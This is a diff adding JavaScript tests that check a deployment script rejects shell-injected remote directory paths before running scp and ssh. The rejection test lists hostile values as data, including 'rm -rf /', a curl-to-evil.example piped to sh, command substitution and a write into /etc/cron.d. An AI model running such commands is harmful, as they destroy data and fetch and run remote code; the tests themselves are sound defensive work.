@@ -14,6 +14,8 @@ const {
   pickWindowsArtifact,
   buildPublishPlan,
   publishDlLanding,
+  assertSafeRemoteRoot,
+  quoteRemotePath,
 } = require('./publish-dl-landing.cjs')
 
 function scratch() {
@@ -25,6 +27,56 @@ test('accepts a dotted release version and rejects a path-like value', () => {
   assert.equal(assertSafeVersion('1.2.3-beta.1'), '1.2.3-beta.1')
   assert.throws(() => assertSafeVersion('../etc/passwd'), /版本号不合法/)
   assert.throws(() => assertSafeVersion(''), /版本号不合法/)
+})
+
+test('accepts an absolute landing directory and trims its trailing slashes', () => {
+  assert.equal(assertSafeRemoteRoot('/www/wwwroot/dl.solov.cc'), '/www/wwwroot/dl.solov.cc')
+  assert.equal(assertSafeRemoteRoot('/www/wwwroot/dl.solov.cc///'), '/www/wwwroot/dl.solov.cc')
+  assert.equal(assertSafeRemoteRoot('  /srv/dl-landing_v2.1  '), '/srv/dl-landing_v2.1')
+})
+
+test('rejects every remote root that could reach the remote shell as a command', () => {
+  for (const injected of [
+    '/www/dl; rm -rf /',
+    '/www/dl && curl http://evil.example/x | sh',
+    '/www/dl`id`',
+    '/www/dl$(id)',
+    '/www/dl$HOME',
+    '/www/dl|tee /etc/cron.d/x',
+    '/www/dl\nrm -rf /',
+    '/www/dl with space',
+    '/www/dl*',
+    '/www/dl"x"',
+    "/www/dl'x'",
+    '/www/../etc',
+    '/..',
+    'www/wwwroot/dl.solov.cc',
+    '../wwwroot',
+    '',
+    '/',
+    '///',
+    undefined,
+    42,
+  ]) {
+    assert.throws(() => assertSafeRemoteRoot(injected), /远端目录不合法/, `should reject ${String(injected)}`)
+  }
+})
+
+test('rejects an injected remote root wherever it enters the script', () => {
+  assert.throws(() => parsePublishArgs(['--remote-root', '/www/dl; id']), /远端目录不合法/)
+  assert.throws(
+    () => buildPublishPlan({ version: '0.1.22', remoteRoot: '/www/dl`id`' }, {}, installerFileNames('0.1.22')),
+    /远端目录不合法/,
+  )
+  assert.throws(
+    () => publishDlLanding({ version: '0.1.22', localDir: '.', remoteRoot: '/www/dl && id' }, {}),
+    /远端目录不合法/,
+  )
+})
+
+test('wraps a remote path in single quotes and escapes any quote inside it', () => {
+  assert.equal(quoteRemotePath('/www/wwwroot/dl.solov.cc'), "'/www/wwwroot/dl.solov.cc'")
+  assert.equal(quoteRemotePath("/www/it's"), "'/www/it'\\''s'")
 })
 
 test('names landing installers after the electron-builder artifacts', () => {
@@ -201,7 +253,11 @@ test('does not scp until --yes and writes the local manifest only after a succes
     })
     assert.equal(uploaded.uploaded, true)
     assert.ok(commands.some((line) => line[0] === 'scp' && line.includes(path.join(directory, names.win))))
-    assert.ok(commands.some((line) => line[0] === 'scp' && line.some((arg) => String(arg).endsWith('/latest.json'))))
+    assert.ok(commands.some((line) => line[0] === 'scp' && line.includes('root@203.0.113.9:/www/wwwroot/dl.solov.cc/files/latest/')))
+    assert.ok(commands.some((line) => line[0] === 'scp' && line.includes('root@203.0.113.9:/www/wwwroot/dl.solov.cc/latest.json')))
+    assert.ok(commands.some((line) => line[0] === 'ssh' && line.includes("mkdir -p '/www/wwwroot/dl.solov.cc/files/latest'")))
+    assert.ok(commands.some((line) => line[0] === 'ssh' && line.some((arg) => String(arg).startsWith("chown www:www '/www/wwwroot/dl.solov.cc/latest.json' '"))))
+    assert.ok(commands.some((line) => line[0] === 'ssh' && line.some((arg) => String(arg).includes("cat '/www/wwwroot/dl.solov.cc/latest.json'"))))
     assert.deepEqual(
       JSON.parse(fs.readFileSync(path.join(directory, 'dl-landing', 'latest.json'), 'utf8')),
       buildLatestManifest('0.1.22'),
